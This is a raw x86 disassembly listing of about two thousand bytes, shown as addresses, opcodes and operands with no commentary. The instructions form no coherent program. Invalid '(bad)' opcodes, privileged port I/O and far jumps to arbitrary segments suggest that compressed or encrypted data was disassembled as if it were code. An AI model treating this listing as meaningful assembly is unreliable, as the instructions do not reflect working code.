  41b5b5:	ja     0x41b5b9
  41b5b7:	lea    edi,[ebx+0x29]
  41b5ba:	ror    DWORD PTR [ecx],cl
  41b5bc:	lds    esi,FWORD PTR [edx-0x7d]
  41b5bf:	dec    edx
  41b5c0:	sub    al,0x27
  41b5c2:	xchg   ebx,eax
  41b5c3:	xor    edx,DWORD PTR [edx]
  41b5c5:	out    dx,eax
  41b5c6:	retf   0x9619
  41b5c9:	ret    
  41b5ca:	dec    edx
  41b5cb:	pushf  
  41b5cc:	add    DWORD PTR [edi+ecx*1-0x3af920ba],ecx
  41b5d3:	retf   
  41b5d4:	fmul   QWORD PTR ds:0x2f16892
  41b5da:	mov    ss,WORD PTR [eax-0x25fecf8f]
  41b5e0:	in     eax,0x5b
  41b5e2:	lock pop esi
  41b5e4:	cwde   
  41b5e5:	fidivr WORD PTR [ecx+0x52]
  41b5e8:	and    al,BYTE PTR [ebx-0x2f]
  41b5eb:	ret    0x9fd9
  41b5ee:	aas    
  41b5ef:	adc    ah,bh
  41b5f1:	mov    dl,0xa0
  41b5f3:	and    ah,cl
  41b5f5:	jmp    0xc36e:0xa7f0d089
  41b5fc:	data16 mov dh,0xaa
  41b5ff:	call   DWORD PTR [ebp+0x18336f0c]
  41b605:	lods   al,BYTE PTR ds:[esi]
  41b606:	or     eax,DWORD PTR ds:0x59ecb693
  41b60c:	lods   eax,DWORD PTR ds:[esi]
  41b60d:	mov    al,ds:0xc0b951ed
  41b612:	dec    eax
  41b614:	sub    ebp,esp
  41b616:	adc    eax,0x761e6349
  41b61b:	mov    BYTE PTR ss:[ebx-0x484321f5],dh
  41b622:	(bad)  [eax+0x11]
  41b625:	lods   al,BYTE PTR ds:[esi]
  41b626:	in     eax,dx
  41b627:	pop    esi
  41b628:	add    DWORD PTR [esi+0x159f719a],edx
  41b62e:	in     al,dx
  41b62f:	and    eax,0xb097079d
  41b634:	jns    0x41b66a
  41b636:	push   cs
  41b637:	add    edx,DWORD PTR [ebx+0x523008b7]
  41b63d:	sbb    eax,0x703b9bb0
  41b642:	sub    eax,0x666fc17d
  41b647:	jo     0x41b5d4
  41b649:	add    esp,DWORD PTR [ebx+0x66]
  41b64c:	mov    ebp,0xd672b464
  41b651:	daa    
  41b652:	aam    0x17
  41b654:	aas    
  41b655:	clc    
  41b656:	sbb    al,0x9d
  41b658:	bound  edx,QWORD PTR [ebp-0x2bab8f6]
  41b65e:	sub    DWORD PTR [ecx-0xa2991ff],0xffffffeb
  41b665:	loopne 0x41b5f5
  41b667:	scas   al,BYTE PTR es:[edi]
  41b668:	xchg   edi,eax
  41b669:	fst    QWORD PTR [edi+eiz*2]
  41b66c:	xor    edi,0x4d818442
  41b672:	fld    TBYTE PTR [ebp-0x2600e789]
  41b678:	fucom  st(5)
  41b67a:	lods   al,BYTE PTR ds:[esi]
  41b67b:	or     al,0xf4
  41b67d:	lahf   
  41b67e:	into   
  41b67f:	dec    ebx
  41b680:	adc    DWORD PTR [ebx-0x45],ebx
  41b683:	xor    ebx,DWORD PTR [eax+0xb]
  41b686:	fs and eax,0x2c4311c1
  41b68c:	add    BYTE PTR [ebp+0x1a366ab2],bh
  41b692:	add    BYTE PTR [ecx-0x2dee90b],bh
  41b698:	jge    0x41b6ff
  41b69a:	jl     0x41b70d
  41b69c:	or     BYTE PTR [ecx],al
  41b69e:	add    BYTE PTR [eax+0x27a2cd22],dl
  41b6a4:	cmc    
  41b6a5:	ret    0xefcd
  41b6a8:	shl    DWORD PTR [edi+eiz*8],0x14
  41b6ac:	or     al,0xe
  41b6ae:	inc    ecx
  41b6af:	retf   0x27c3
  41b6b2:	mov    cl,0x9f
  41b6b4:	stos   BYTE PTR es:[edi],al
  41b6b5:	pop    eax
  41b6b6:	push   edx
  41b6b7:	jmp    0xc38786a2
  41b6bc:	rcr    BYTE PTR [edx-0x26],cl
  41b6bf:	shl    BYTE PTR ds:0x266d4157,0xc1
  41b6c6:	inc    ecx
  41b6c7:	jl     0x41b692
  41b6c9:	cs add al,0x6d
  41b6cc:	dec    edx
  41b6cd:	dec    ebp
  41b6ce:	(bad)  
  41b6cf:	xor    al,0x56
  41b6d1:	inc    esp
  41b6d2:	xor    DWORD PTR [eax],ecx
  41b6d4:	(bad)  
  41b6d6:	imul   edi,DWORD PTR [ebx+0x34],0x34
  41b6da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6db:	ret    
  41b6dc:	jmp    0xd3d5:0xb31e3a13
  41b6e3:	xchg   esp,eax
  41b6e4:	xchg   ebp,eax
  41b6e5:	or     DWORD PTR [ecx],esp
  41b6e7:	test   eax,0x2ab9e89a
  41b6ec:	adc    eax,ecx
  41b6ee:	ret    0xb601
  41b6f1:	dec    ecx
  41b6f2:	sbb    dl,BYTE PTR [eax+edi*1+0x19]
  41b6f6:	cmp    DWORD PTR [eax-0x7f],0xe9f141a4
  41b6fd:	clc    
  41b6fe:	add    DWORD PTR [edi-0x2e255e65],eax
  41b704:	sub    BYTE PTR [edi+0x380f415b],cl
  41b70a:	dec    esp
  41b70b:	xor    DWORD PTR [edi-0x1742560b],eax
  41b711:	cs in  al,0xbc
  41b714:	jb     0x41b739
  41b716:	xor    dl,BYTE PTR [esi]
  41b718:	dec    ebx
  41b719:	int3   
  41b71a:	xor    DWORD PTR [eax-0x3c],esi
  41b71d:	(bad)  
  41b71e:	dec    eax
  41b71f:	jg     0x41b784
  41b721:	sti    
  41b722:	or     dh,BYTE PTR [esi-0x3d6de44]
  41b728:	test   BYTE PTR [ebx-0x6c],bl
  41b72b:	popf   
  41b72c:	daa    
  41b72d:	ja     0x41b6e8
  41b72f:	cs jl  0x41b6f3
  41b732:	fmul   QWORD PTR [edx]
  41b734:	cmp    BYTE PTR [ebx],dl
  41b736:	lods   eax,DWORD PTR ds:[esi]
  41b737:	loopne 0x41b77e
  41b739:	cli    
  41b73a:	loopne 0x41b71f
  41b73c:	inc    edi
  41b73d:	fwait
  41b73e:	loopne 0x41b751
  41b740:	div    DWORD PTR [edi+edi*2+0x47]
  41b744:	push   0x80c58337
  41b749:	fsubp  st(4),st
  41b74b:	int3   
  41b74c:	into   
  41b74d:	test   BYTE PTR [esi+esi*1-0x7d],al
  41b751:	dec    eax
  41b752:	adc    edi,DWORD PTR [edi+0x16]
  41b755:	mov    ah,0xde
  41b757:	int3   
  41b758:	mov    ds:0x82035cb5,ax
  41b75e:	fs mov ah,0x48
  41b761:	push   ebx
  41b762:	jno    0x41b777
  41b764:	sub    ebp,DWORD PTR [ebx]
  41b766:	pusha  
  41b767:	jl     0x41b7b2
  41b769:	sbb    esi,ebx
  41b76b:	out    0x46,al
  41b76d:	fsub   QWORD PTR [eax+0x188ddef1]
  41b773:	xor    eax,0x392f4e92
  41b778:	mov    edi,0xafcc3f72
  41b77d:	jmp    0xad02:0xbe6b1bf3
  41b784:	dec    ebp
  41b785:	imul   edi,DWORD PTR [edx-0x7283ea6c],0x3a
  41b78c:	fwait
  41b78d:	inc    ecx
  41b78e:	or     al,0x9
  41b790:	push   ds
  41b791:	jae    0x41b7b3
  41b793:	and    DWORD PTR [ebp+0x6f5d9c71],esi
  41b799:	xchg   esi,eax
  41b79a:	mov    cl,BYTE PTR [esi-0x18fff15a]
  41b7a0:	aad    0xbd
  41b7a2:	pop    ecx
  41b7a3:	sbb    eax,0x9f69761d
  41b7a8:	clc    
  41b7a9:	hlt    
  41b7aa:	loop   0x41b819
  41b7ac:	push   cs
  41b7ad:	neg    DWORD PTR [esi+0x4b7adf9c]
  41b7b3:	jle    0x41b75c
  41b7b5:	icebp  
  41b7b6:	xor    ch,BYTE PTR [edi-0x2d7bb875]
  41b7bc:	je     0x41b807
  41b7be:	and    BYTE PTR [ecx-0x67],cl
  41b7c1:	adc    BYTE PTR fs:[edi],dl
  41b7c4:	push   edi
  41b7c5:	repz mov bl,0xd4
  41b7c8:	and    eax,0x1819807d
  41b7cd:	call   FWORD PTR ds:0xf96add18
  41b7d3:	repnz fs aam 0xb1
  41b7d7:	adc    BYTE PTR [esi],ch
  41b7d9:	mov    ebp,0x65aeac95
  41b7de:	pushf  
  41b7df:	jnp    0x41b7f8
  41b7e1:	cmp    DWORD PTR [ecx+0x52],edx
  41b7e4:	inc    ebx
  41b7e5:	and    bl,BYTE PTR [edi]
  41b7e7:	sar    BYTE PTR [edi+0x8ed063c],0x2f
  41b7ee:	jecxz  0x41b7ba
  41b7f0:	pcmpgtw mm2,mm5
  41b7f3:	jno    0x41b85b
  41b7f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b7f6:	repnz enter 0x5931,0xa7
  41b7fb:	mov    eax,ds:0xdd99058e
  41b800:	sti    
  41b801:	gs xchg esp,eax
  41b803:	(bad)  
  41b804:	fstp   DWORD PTR [ebx-0x52e69d7d]
  41b80a:	xor    al,0x73
  41b80c:	jae    0x41b829
  41b80e:	push   es
  41b80f:	gs stos DWORD PTR es:[edi],eax
  41b811:	cmp    eax,0x46e24c44
  41b816:	mov    es:0x473daba1,eax
  41b81c:	(bad)  
  41b81d:	sbb    BYTE PTR [esi],bh
  41b81f:	je     0x41b88c
  41b821:	pop    ecx
  41b822:	mov    dh,0xdf
  41b824:	gs sti 
  41b826:	icebp  
  41b827:	test   DWORD PTR [edx-0x13685bc5],esi
  41b82d:	cdq    
  41b82e:	mov    edx,DWORD PTR [ecx]
  41b830:	adc    dl,BYTE PTR [ebx+0x1a]
  41b833:	sbb    DWORD PTR [ebx+0x46],ecx
  41b836:	addr16 dec edx
  41b838:	mov    BYTE PTR [edi+0x2ead11b9],bh
  41b83e:	push   esp
  41b83f:	cli    
  41b840:	sbb    al,0xeb
  41b842:	sub    al,0xdd
  41b844:	push   ebp
  41b845:	ja     0x41b83d
  41b847:	mov    ch,0x62
  41b849:	popf   
  41b84a:	or     DWORD PTR [ebp+0x42],ecx
  41b84d:	adc    al,0xf3
  41b84f:	jo     0x41b867
  41b851:	inc    esi
  41b852:	xlat   BYTE PTR ds:[ebx]
  41b853:	data16 int 0x46
  41b856:	in     al,dx
  41b857:	test   bl,bl
  41b859:	sbb    al,0xc3
  41b85b:	out    dx,al
  41b85c:	inc    edx
  41b85d:	cmp    eax,0x9e5ac7a8
  41b862:	pop    es
  41b863:	pusha  
  41b864:	je     0x41b810
  41b866:	cmp    al,0x9c
  41b868:	punpckhwd mm1,QWORD PTR [edi+0xa]
  41b86c:	iret   
  41b86d:	aas    
  41b86e:	push   esi
  41b86f:	scas   al,BYTE PTR es:[edi]
  41b870:	addr16 aas 
  41b872:	in     eax,dx
  41b873:	sbb    al,0x75
  41b875:	and    edx,0xffffffc5
  41b878:	mov    bl,0x7c
  41b87a:	adc    DWORD PTR [edx+ecx*1-0x54],esi
  41b87e:	pop    esp
  41b87f:	or     al,0x2e
  41b881:	mov    dl,0xaf
  41b883:	retf   
  41b884:	adc    DWORD PTR [esi+0x4d016869],esi
  41b88a:	jno    0x41b89c
  41b88c:	mov    bl,0x33
  41b88e:	aaa    
  41b88f:	pop    es
  41b890:	aad    0x69
  41b892:	add    edx,DWORD PTR [esp+eax*2+0x4c]
  41b896:	in     eax,0x30
  41b898:	aam    0x67
  41b89a:	es data16 in al,dx
  41b89d:	sub    ch,dl
  41b89f:	push   edi
  41b8a0:	mov    edx,0xfffeab7f
  41b8a5:	rcr    edi,1
  41b8a7:	xchg   ebx,eax
  41b8a8:	mov    gs,ebx
  41b8aa:	(bad)
  41b8ae:	cmp    al,0x20
  41b8b0:	(bad)  
  41b8b1:	push   ebx
  41b8b2:	dec    ebx
  41b8b3:	mov    eax,0xd72cba3b
  41b8b8:	mov    dl,dh
  41b8ba:	pop    ss
  41b8bb:	or     eax,0x2a4c3bf3
  41b8c0:	leave  
  41b8c1:	push   esi
  41b8c2:	dec    ecx
  41b8c3:	shl    DWORD PTR [esi+0x71fb52ba],cl
  41b8c9:	clc    
  41b8ca:	mov    ch,0x1
  41b8cc:	jecxz  0x41b901
  41b8ce:	scas   al,BYTE PTR es:[edi]
  41b8cf:	out    dx,eax
  41b8d0:	retf   
  41b8d1:	clc    
  41b8d2:	sub    bh,bl
  41b8d4:	inc    edi
  41b8d5:	inc    ebp
  41b8d6:	or     esp,ecx
  41b8d8:	pop    edx
  41b8d9:	xchg   ebp,eax
  41b8da:	test   BYTE PTR [edi+0x45201a7f],ch
  41b8e0:	inc    ebp
  41b8e1:	sub    BYTE PTR [edx-0x5d2afb0e],0xc
  41b8e8:	lahf   
  41b8e9:	repz xlat BYTE PTR ds:[ebx]
  41b8eb:	fadd   QWORD PTR [esi]
  41b8ed:	push   eax
  41b8ee:	arpl   WORD PTR ds:[edx-0x316140d1],sp
  41b8f5:	shl    ch,cl
  41b8f7:	adc    edx,DWORD PTR [esi]
  41b8f9:	imul   edx,DWORD PTR [ecx+0x70],0x8
  41b8fd:	jae    0x41b936
  41b8ff:	push   0xd67ae6ac
  41b904:	pop    esi
  41b905:	push   eax
  41b906:	lea    eax,[ecx-0x31761578]
  41b90c:	das    
  41b90d:	or     al,0x22
  41b90f:	dec    esi
  41b910:	ret    
  41b911:	or     BYTE PTR [eax],bh
  41b913:	call   0xade7:0xa279a5e0
  41b91a:	jns    0x41b987
  41b91c:	jno    0x41b948
  41b91e:	pop    ss
  41b91f:	and    ebx,ebx
  41b921:	lds    esp,FWORD PTR [ebx+0x67]
  41b924:	out    0x83,al
  41b926:	xchg   esi,eax
  41b927:	out    0xc,al
  41b929:	and    al,0xe2
  41b92c:	rcr    BYTE PTR [esi+0x5f],1
  41b92f:	sub    DWORD PTR [esi+0xaf7ae2f],edi
  41b935:	cmp    al,0xd3
  41b937:	adc    bh,BYTE PTR [eax+0x44478c2]
  41b93d:	and    BYTE PTR [ecx],al
  41b93f:	repz iret 
  41b941:	mov    ebx,0x1b5ff9c0
  41b946:	push   ds
  41b947:	add    BYTE PTR [ebx],dl
  41b949:	adc    BYTE PTR [ecx+0x61abf690],0xb5
  41b950:	push   ebp
  41b951:	xchg   DWORD PTR [ebp+0x23c259bf],ebx
  41b957:	sub    edi,ebp
  41b959:	ror    BYTE PTR ds:[ecx],cl
  41b95c:	push   edx
  41b95d:	sub    esi,ecx
  41b95f:	out    dx,eax
  41b960:	xchg   ecx,eax
  41b961:	mov    ds,WORD PTR [ecx-0x37]
  41b964:	pop    esi
  41b965:	mov    al,ds:0x7ea61f26
  41b96a:	push   eax
  41b96b:	push   esi
  41b96c:	popa   
  41b96d:	jg     0x41b910
  41b96f:	mov    bl,0xda
  41b971:	lods   al,BYTE PTR ss:[esi]
  41b973:	add    bl,BYTE PTR [ecx]
  41b975:	add    cl,BYTE PTR [esi-0x69]
  41b978:	add    al,0xea
  41b97a:	mov    edi,0x1f2d7c57
  41b97f:	xor    ecx,DWORD PTR [eax+eiz*8+0x71]
  41b983:	test   eax,0x7a07c9aa
  41b988:	cli    
  41b989:	pop    edi
  41b98a:	stos   BYTE PTR es:[edi],al
  41b98b:	mov    ch,0x2
  41b98d:	stc    
  41b98e:	data16 lods al,BYTE PTR ds:[si]
  41b991:	and    BYTE PTR [ecx-0x414260a],cl
  41b997:	ins    DWORD PTR es:[edi],dx
  41b998:	cmc    
  41b999:	es jge 0x41b9f2
  41b99c:	stos   BYTE PTR es:[edi],al
  41b99d:	push   0x8a8b641d
  41b9a2:	aas    
  41b9a3:	xor    ebx,edx
  41b9a5:	push   ebp
  41b9a6:	inc    edi
  41b9a7:	or     eax,0xf7761482
  41b9ac:	aad    0xa2
  41b9ae:	fstp   DWORD PTR [eax-0x2ff1d3d4]
  41b9b4:	aas    
  41b9b5:	mov    ebp,DWORD PTR [edi-0x5fd1dbbf]
  41b9bb:	outs   dx,BYTE PTR ds:[esi]
  41b9bc:	call   0x7fd5:0x2dee48da
  41b9c3:	dec    ebx
  41b9c4:	iret   
  41b9c5:	repz fmulp st(0),st
  41b9c8:	and    DWORD PTR [edi+0x2e],edx
  41b9cb:	fisttp DWORD PTR [ebp-0x1b16b5f9]
  41b9d1:	jmp    0xa824f25f
  41b9d6:	mov    dh,0xd0
  41b9d8:	xchg   ecx,eax
  41b9d9:	es dec ebp
  41b9db:	inc    esp
  41b9dc:	and    bl,cl
  41b9de:	neg    DWORD PTR ds:0x6616c635
  41b9e4:	mov    cl,0xcd
  41b9e6:	jnp    0x41b987
  41b9e8:	push   eax
  41b9e9:	push   ecx
  41b9ea:	sbb    dl,BYTE PTR [edi]
  41b9ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9ed:	stos   DWORD PTR es:[edi],eax
  41b9ee:	dec    edx
  41b9ef:	pop    es
  41b9f0:	ins    BYTE PTR es:[edi],dx
  41b9f1:	lock add ah,0xc
  41b9f5:	les    ecx,FWORD PTR es:[eax-0x1a856c80]
  41b9fc:	jg     0x41ba20
  41b9fe:	dec    ebp
  41b9ff:	cmp    ah,dl
  41ba01:	sbb    eax,0x27059ef4
  41ba06:	inc    esp
  41ba07:	call   0x13e93294
  41ba0c:	stc    
  41ba0d:	jmp    0xf2d8:0x9263b21c
  41ba14:	(bad)  [ebx+0x52]
  41ba17:	jb     0x41ba87
  41ba19:	sub    al,0x3f
  41ba1b:	push   ebp
  41ba1c:	cdq    
  41ba1d:	dec    edi
  41ba1e:	xchg   edi,eax
  41ba1f:	mov    bh,0x87
  41ba21:	cmp    BYTE PTR [edx-0x1c151adc],0x4
  41ba28:	push   eax
  41ba29:	aas    
  41ba2a:	xchg   esp,eax
  41ba2b:	pushf  
  41ba2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba2d:	cs xor bl,ah
  41ba30:	stos   DWORD PTR es:[di],eax
  41ba32:	pop    ds
  41ba33:	aam    0x7e
  41ba35:	(bad)  
  41ba37:	(bad)  
  41ba39:	jne    0x41baa5
  41ba3b:	pop    edx
  41ba3c:	scas   al,BYTE PTR es:[edi]
  41ba3d:	and    BYTE PTR [edx],0x67
  41ba40:	dec    esp
  41ba41:	aaa    
  41ba42:	lock movq mm7,QWORD PTR [ecx-0x9]
  41ba47:	iret   
  41ba48:	ja     0x41ba1c
  41ba4a:	test   ecx,ebp
  41ba4c:	xor    eax,0xa902813c
  41ba51:	repnz cld 
  41ba53:	jns    0x41ba95
  41ba55:	pop    ss
  41ba56:	mov    ebp,0x35d58a6d
  41ba5b:	xor    al,0x78
  41ba5d:	mov    ah,0x63
  41ba5f:	sahf   
  41ba60:	xor    bh,BYTE PTR [edx-0x14]
  41ba63:	sbb    DWORD PTR [eax],0x12580773
  41ba69:	mov    ecx,0x8afb4d02
  41ba6e:	cli    
  41ba6f:	dec    edx
  41ba70:	aam    0x7b
  41ba72:	inc    eax
  41ba73:	repnz in eax,dx
  41ba75:	add    al,0x8
  41ba77:	fadd   DWORD PTR [edx+0x565b4bdc]
  41ba7d:	mov    edi,0x6959cb4b
  41ba82:	je     0x41baec
  41ba84:	adc    BYTE PTR [ebx],dl
  41ba86:	stc    
  41ba87:	stos   DWORD PTR es:[edi],eax
  41ba88:	repz (bad) 
  41ba8a:	or     ch,BYTE PTR gs:[ebx]
  41ba8d:	inc    eax
  41ba8e:	lods   eax,DWORD PTR ds:[esi]
  41ba8f:	push   DWORD PTR [ebx]
  41ba91:	out    dx,al
  41ba92:	push   ecx
  41ba93:	jmp    0x41bab2
  41ba95:	int3   
  41ba96:	dec    esp
  41ba97:	push   es
  41ba98:	push   ebp
  41ba99:	push   ss
  41ba9a:	repz retf 0x1ffd
  41ba9e:	cmp    al,0xb8
  41baa0:	pop    es
  41baa1:	cs push ebp
  41baa3:	fmul   st(0),st
  41baa5:	aad    0xc0
  41baa7:	dec    esi
  41baa8:	jbe    0x41ba40
  41baaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41baab:	je     0x41ba9c
  41baad:	push   edi
  41baae:	sar    BYTE PTR [edi-0x1a],1
  41bab1:	push   esp
  41bab2:	adc    al,0x98
  41bab4:	and    edi,DWORD PTR [esi-0xe350505]
  41baba:	jo     0x41ba92
  41babc:	cmp    ah,dh
  41babe:	inc    esp
  41babf:	add    DWORD PTR [edx+0x6d6853e5],ebp
  41bac5:	mov    al,0x84
  41bac7:	jp     0x41ba76
  41bac9:	ja     0x41bac3
  41bacb:	jmp    0x1945773b
  41bad0:	clc    
  41bad1:	ins    DWORD PTR es:[edi],dx
  41bad2:	les    ebx,FWORD PTR [eax+0x122e25fb]
  41bad8:	mov    eax,0xf013a346
  41badd:	pop    ebp
  41bade:	adc    edi,DWORD PTR [edx+ebx*1+0x7ba01063]
  41bae5:	das    
  41bae6:	adc    al,0xac
  41bae8:	xchg   esp,eax
  41bae9:	inc    esp
  41baea:	out    0x11,eax
  41baec:	sbb    DWORD PTR [eax+0x41],0xffffffd0
  41baf0:	xchg   DWORD PTR [edi+eax*8-0x69fa63e0],edi
  41baf7:	dec    ebp
  41baf8:	fwait
  41baf9:	cld    
  41bafa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bafb:	stos   BYTE PTR es:[edi],al
  41bafc:	xchg   BYTE PTR [ecx+0x62],bh
  41baff:	dec    ebp
  41bb00:	push   ss
  41bb01:	test   al,0xf5
  41bb03:	xchg   ebp,eax
  41bb04:	jae    0x41bb68
  41bb06:	push   ebp
  41bb07:	mov    esp,0xe5f75cd1
  41bb0c:	push   ebp
  41bb0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb0e:	ds and eax,0x3d723a5b
  41bb14:	fldcw  WORD PTR [edx+0x5b]
  41bb17:	clc    
  41bb18:	sub    BYTE PTR [ebx-0x19],bl
  41bb1b:	lea    esi,[ecx]
  41bb1d:	xor    cl,BYTE PTR [eax+ebp*2]
  41bb20:	mov    bh,0xe1
  41bb22:	sti    
  41bb23:	out    0x2e,al
  41bb25:	xchg   edi,eax
  41bb26:	sbb    DWORD PTR [edx-0x70],esi
  41bb29:	int3   
  41bb2a:	sub    DWORD PTR [edi+0x3c],edx
  41bb2d:	out    dx,al
  41bb2e:	or     eax,0x2b1e4923
  41bb33:	mov    ebp,0xf43ccc12
  41bb38:	adc    eax,0xb0d4eee2
  41bb3d:	sub    eax,0x78c5b221
  41bb42:	and    al,0xaf
  41bb44:	pop    esp
  41bb45:	mov    ds:0x44554a7b,al
  41bb4a:	xchg   ebp,eax
  41bb4b:	dec    ebp
  41bb4c:	push   esp
  41bb4d:	pop    esp
  41bb4e:	out    dx,eax
  41bb4f:	push   edx
  41bb50:	and    eax,edi
  41bb52:	add    al,0x29
  41bb54:	mov    esp,0x10240899
  41bb59:	pop    eax
  41bb5a:	call   0x5da5:0xc01a1319
  41bb61:	and    eax,0xd6aca7df
  41bb66:	sub    dl,BYTE PTR [esi+eax*1+0x52]
  41bb6a:	ins    DWORD PTR es:[di],dx
  41bb6c:	dec    ebp
  41bb6d:	adc    eax,0x7a700d5d
  41bb72:	es mov cl,0xf9
  41bb75:	xor    BYTE PTR [ebp+0x3266955d],al
  41bb7b:	fidivr WORD PTR [esi+0x32]
  41bb7e:	mov    ds:0x12f51b3f,eax
  41bb83:	jle    0x41bb60
  41bb85:	in     al,dx
  41bb86:	popa   
  41bb87:	or     dl,al
  41bb89:	shl    DWORD PTR [ebp*4-0x4305e25b],cl
  41bb90:	fldcw  WORD PTR [ebx+0x5df90a99]
  41bb96:	in     al,0x30
  41bb98:	jecxz  0x41bb48
  41bb9a:	cmp    edx,esp
  41bb9c:	je     0x41bb89
  41bb9e:	xor    al,0xa2
  41bba0:	aas    
  41bba1:	out    dx,al
  41bba2:	push   ecx
  41bba3:	cmp    al,dh
  41bba5:	adc    al,0x7b
  41bba7:	in     al,0xef
  41bba9:	pop    ecx
  41bbaa:	popa   
  41bbab:	mov    ecx,DWORD PTR [eax]
  41bbad:	sbb    dh,bl
  41bbaf:	add    DWORD PTR [edi-0x4292c5fd],0xc44b71ce
  41bbb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbba:	or     eax,0xf369c81e
  41bbbf:	repz int 0x2e
  41bbc2:	repz lock add edx,DWORD PTR [esi-0x2667cabc]
  41bbca:	and    al,0x17
  41bbcc:	es jg  0x41bbf8
  41bbcf:	jp     0x41bb7f
  41bbd1:	pop    edi
  41bbd2:	enter  0x815a,0xd6
  41bbd6:	push   ds
  41bbd7:	mov    bl,0x75
  41bbd9:	push   esi
  41bbda:	add    al,0x3b
  41bbdc:	bound  esi,QWORD PTR ds:0xce5a81bb
  41bbe2:	int3   
  41bbe3:	sti    
  41bbe4:	mov    ah,0x46
  41bbe6:	xor    eax,0xb2758bf7
  41bbeb:	push   ds
  41bbec:	sbb    eax,0x67c4ee98
  41bbf1:	xchg   cl,ah
  41bbf3:	cld    
  41bbf4:	loopne 0x41bb8c
  41bbf6:	ja     0x41bbc5
  41bbf8:	ror    DWORD PTR [ecx-0x6aeff731],0x7a
  41bbff:	mov    cl,dh
  41bc01:	mov    ah,0xb3
  41bc03:	fsub   st(0),st
  41bc05:	and    DWORD PTR [eax-0x189325e4],esi
  41bc0b:	and    eax,0x9dda2c0f
  41bc10:	lock out 0xa8,al
  41bc13:	xor    DWORD PTR [edi],ecx
  41bc15:	cmp    DWORD PTR [eax+0x76],0xffffffe1
  41bc19:	aad    0x4
  41bc1b:	out    0xd1,eax
  41bc1d:	add    ecx,ecx
  41bc1f:	cmp    eax,0x5b42870d
  41bc24:	repnz sub al,0x1d
  41bc27:	sub    ebx,DWORD PTR [edx+ecx*4+0x77fd1880]
  41bc2e:	inc    eax
  41bc2f:	cld    
  41bc30:	push   eax
  41bc31:	pop    ss
  41bc32:	cmc    
  41bc33:	into   
  41bc34:	out    dx,eax
  41bc35:	fsubrp st(2),st
  41bc37:	push   ebp
  41bc38:	mov    ah,BYTE PTR [ebp+0x7e]
  41bc3b:	fs ret 0xb2a4
  41bc3f:	dec    eax
  41bc40:	cwde   
  41bc41:	jg     0x41bc0f
  41bc43:	ja     0x41bc5f
  41bc45:	mov    eax,ds:0x2dc0022f
  41bc4a:	mov    WORD PTR [esi+0x20],ds
  41bc4d:	ret    
  41bc4e:	inc    ebp
  41bc4f:	loope  0x41bc09
  41bc51:	(bad)  
  41bc52:	cli    
  41bc53:	mov    ds:0x94dbf017,al
  41bc58:	sahf   
  41bc59:	xchg   esi,eax
  41bc5a:	pop    eax
  41bc5b:	adc    al,0xe5
  41bc5d:	xchg   BYTE PTR [edi+0x68e44607],bl
  41bc63:	lock sar DWORD PTR [edx-0x13bfe91],0x84
  41bc6b:	pop    ebp
  41bc6c:	push   0x5f
  41bc6e:	mov    dl,0xe2
  41bc70:	adc    eax,DWORD PTR [si]
  41bc73:	pop    esp
  41bc74:	(bad)  
  41bc75:	pop    ds
  41bc76:	add    esi,DWORD PTR [ebx]
  41bc78:	mov    al,0x35
  41bc7a:	pushf  
  41bc7b:	jo     0x41bc00
  41bc7d:	dec    eax
  41bc7e:	dec    edx
  41bc7f:	rdtsc  
  41bc81:	arpl   dx,bx
  41bc83:	or     DWORD PTR [esi-0x71],esi
  41bc86:	jne    0x41bcb7
  41bc88:	push   ebx
  41bc89:	inc    ebx
  41bc8a:	cmp    eax,0x2116e7ee
  41bc8f:	shr    BYTE PTR [ecx+0x6e],1
  41bc92:	cmp    ah,BYTE PTR [edx]
  41bc94:	sar    BYTE PTR [ebp-0x2ff47570],1
  41bc9a:	test   DWORD PTR [eax],ebp
  41bc9c:	push   edi
  41bc9d:	nop
  41bc9e:	lods   al,BYTE PTR ds:[esi]
  41bc9f:	rol    BYTE PTR es:[esi+0x115a29d2],cl
  41bca6:	push   esp
  41bca7:	add    DWORD PTR [ebp+0x7d],ebx
  41bcaa:	mov    ah,BYTE PTR [ebx+0x4b039d2f]
  41bcb0:	add    al,0xd2
  41bcb2:	pop    ebp
  41bcb3:	aaa    
  41bcb4:	stos   BYTE PTR es:[edi],al
  41bcb5:	push   ecx
  41bcb6:	aad    0xbe
  41bcb8:	pop    ebx
  41bcb9:	test   eax,0x7e860f50
  41bcbe:	in     eax,dx
  41bcbf:	test   cl,dh
  41bcc1:	jle    0x41bcfe
  41bcc3:	push   ss
  41bcc4:	cmp    esp,DWORD PTR [esi-0x12]
  41bcc7:	loope  0x41bc51
  41bcc9:	jg     0x41bd0c
  41bccb:	pop    ecx
  41bccc:	mov    esi,0x1bab3944
  41bcd1:	fiadd  WORD PTR [ebx+ebp*1]
  41bcd4:	stos   BYTE PTR es:[edi],al
  41bcd5:	sbb    bh,BYTE PTR [edi+0x4297f375]
  41bcdb:	and    al,dl
  41bcdd:	jg     0x41bc9e
  41bcdf:	cld    
  41bce0:	jo     0x41bce9
  41bce2:	xchg   edx,eax
  41bce4:	test   al,0x2d
  41bce6:	adc    eax,DWORD PTR [ecx+ebp*1+0x96d0988]
  41bced:	loope  0x41bcc8
  41bcef:	xor    DWORD PTR [ebp+ebp*4+0x32],ebx
  41bcf3:	or     edx,DWORD PTR [ebx]
  41bcf5:	xor    BYTE PTR [ecx-0x21],bl
  41bcf8:	xor    BYTE PTR ds:0x800557cd,cl
  41bcfe:	retf   
  41bcff:	jg     0x41bcdd
  41bd01:	jo     0x41bcff
  41bd03:	add    ch,BYTE PTR [edx-0x61ad29ef]
  41bd09:	loope  0x41bd63
  41bd0b:	cmp    DWORD PTR [edx-0x3c3e1c0a],ecx
  41bd11:	inc    esp
  41bd12:	mov    ch,0x40
  41bd14:	(bad)  
  41bd15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd16:	in     al,0x85
  41bd18:	scas   eax,DWORD PTR es:[edi]
  41bd19:	mov    esp,0xa54f823f
  41bd1e:	cmp    esi,DWORD PTR [eax]
  41bd20:	pop    ds
  41bd21:	mov    ds:0x4ea51a6b,al
  41bd26:	and    cl,BYTE PTR [ebx+edi*4-0x2e]
